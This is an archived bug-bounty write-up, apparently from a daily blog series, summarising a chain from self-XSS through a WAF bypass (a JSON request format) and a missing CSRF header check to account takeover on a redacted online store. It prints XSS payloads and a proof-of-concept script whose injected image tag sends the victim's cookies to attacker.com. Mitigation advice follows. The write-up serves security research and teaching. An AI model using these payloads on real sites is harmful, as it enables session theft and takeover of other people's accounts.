# Day 5

- **Source URL:** https://medium.com/@danielbelay/day-5-chaining-bugs-from-self-xss-to-full-account-takeover-d01ab3759e06?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20250630092146/https://medium.com/@danielbelay/day-5-chaining-bugs-from-self-xss-to-full-account-takeover-d01ab3759e06
- **Fetched:** 2026-11-21
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/8738 (id 8738)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# Day 5: Chaining Bugs from Self-XSS to Full Account Takeover

🔍 **Vulnerability Type:** Self-XSS → WAF Bypass → CSRF Bypass → ATO

🎯 **Target:** Redacted Online Store

💰 **Severity:** P2 (High)

# Introduction

Welcome back to **Day 5** of my **100-day Account Takeover (ATO) challenge!** Today, I’ll share a fascinating bug chain where a researcher **bypassed a WAF**, exploited **Self-XSS**, and **chained it with CSRF bypass** to achieve full **Account Takeover.** 🚀

This write-up is inspired by **Behnam Yazdanpanah’s** research, and I’m summarizing it to highlight how small misconfigurations can lead to **high-severity exploits.**

# Step 1: Finding the Initial XSS

The researcher was testing an **online store** running **PHP** behind **Akamai WAF**. After analyzing multiple API endpoints, they found one that stood out:

📌 **Vulnerable Endpoint:**

`/xhr_preferences/index/change/`
This endpoint handled **user preferences** like:

- Birth date
- Favorite brands
- Shopping interests

They injected a **basic HTML payload** into a field, and it was stored!

✅ **Working Payload (HTML Injection):**

`"><img src=1 onerror=alert(1)>`
🚨 **Problem:** The Akamai WAF **blocked script execution (403 Forbidden).**

# Step 2: Bypassing the WAF

After spending **two hours** testing various payloads (including those from [this WAF bypass list](https://github.com/Walidhossain010/WAF-bypass-xss-payloads)), they realized something:

🔍 **XSS was only stored in the first\_name field, but not in other fields.**

💡 **Key Discovery:** The request format was different! Instead of standard **query parameters**, this endpoint accepted **JSON payloads.**

So, they modified the request format:

📌 **Modified Request (Bypassing WAF)**

```
{
  "anything_else": "iiiiiiiiiiii",
  "birth_day": 2,
  "birth_month": 1,
  "birth_year": 2009,
  "brands_to_stock[]": "\"><img src=1 onerror=alert(1)>",
  "anything_else": "test"
}
```
🔥 **BOOM! The payload executed successfully, bypassing the WAF!**

*Lesson: If your XSS is getting blocked, experiment with different request formats (JSON, multipart, XML, etc.). 🚀*


# Step 3: CSRF Bypass → Account Takeover

Now, the challenge was **escalating Self-XSS into a full account takeover.**

The researcher noticed that when a user **logs in**, the site **sets a CSRF token as a cookie**:

`Set-Cookie: csrf=7e3f4ebc6d40b5; Path=/`
Every **POST request** required:

1️⃣ A **CSRF token in the cookie**

2️⃣ The **same CSRF token in the request header**

🔍 **Key Discovery:** The **preferences update endpoint** didn’t validate the CSRF header! 🤯

So, they **removed the CSRF token** from the request header and sent it again…

✅ **Result: The request was accepted!** 🎯

🔥 **Impact:** This allowed an **attacker-controlled JavaScript** to send POST requests **on behalf of the victim** → leading to **account takeover.**

# Step 4: Exploiting the ATO with a POC

The researcher created this **POC script** to steal a victim’s session and redirect them:

📌 **Malicious JavaScript (POC):**

```
<script>
function loadDoc() {
  const xhttp = new XMLHttpRequest();
  xhttp.onload = function() {
    document.getElementById("demo").innerHTML = this.responseText;
  }
```
xhttp.open("POST", "https://www.redacted.com/xhr\_preferences/index/change/");

xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

xhttp.withCredentials = true;

xhttp.send('{ "brands\_to\_stock\[\]": "\">\<img src=x onerror=this.src=\'http://attacker.com/?c=\' + document.cookie>" }');

}

loadDoc();setTimeout(() => {

window.location.href = "https://www.redacted.com/xhr\_preferences/index/index/";

}, 5000);

\</script>

# How the Attack Works:

1️⃣ The **attacker** hosts this script on their website.

2️⃣ The **victim** logs into their account.

3️⃣ The **victim visits the attacker’s site** (phishing, malicious ads, etc.).

4️⃣ The script runs, sending **XSS+CSRF requests** to modify the victim’s preferences.

5️⃣ **Account Takeover achieved** by stealing the session cookie.

# Impact: Why This Is Critical?

💀 **This bug chain leads to full Account Takeover!**

- **Self-XSS** → Escalated to Stored XSS
- **WAF Bypass** → Allowed script execution
- **CSRF Bypass** → Allowed unauthorized actions
- **Account Takeover** → Stolen session cookies & sensitive data

This shows why **small vulnerabilities** (like Self-XSS) **should never be ignored** — they can lead to **critical exploits.** 🚨

# Mitigation: How to Fix This?

🛠️ **Developers should:**

✅ **Sanitize user input** → Prevent XSS in stored fields.

✅ **Enforce WAF properly** → Validate different request formats.

✅ **Use strict CSRF validation** → Check both the **header & cookie tokens.**

✅ **Use HTTP-only cookies** → Prevent JavaScript from accessing session tokens.

# Conclusion

🔹 This was an **amazing example** of how **small bugs can be chained into high-severity exploits.**

🔹 **WAF bypass techniques** are useful when testing XSS defenses.

🔹 **Never assume Self-XSS is useless — find a way to escalate it!** 🚀

📅 **This was Day 5 of my 100-day ATO challenge!** See you tomorrow for another exciting write-up! 🎯

👨💻 **Original Researcher:** Behnam Yazdanpanah
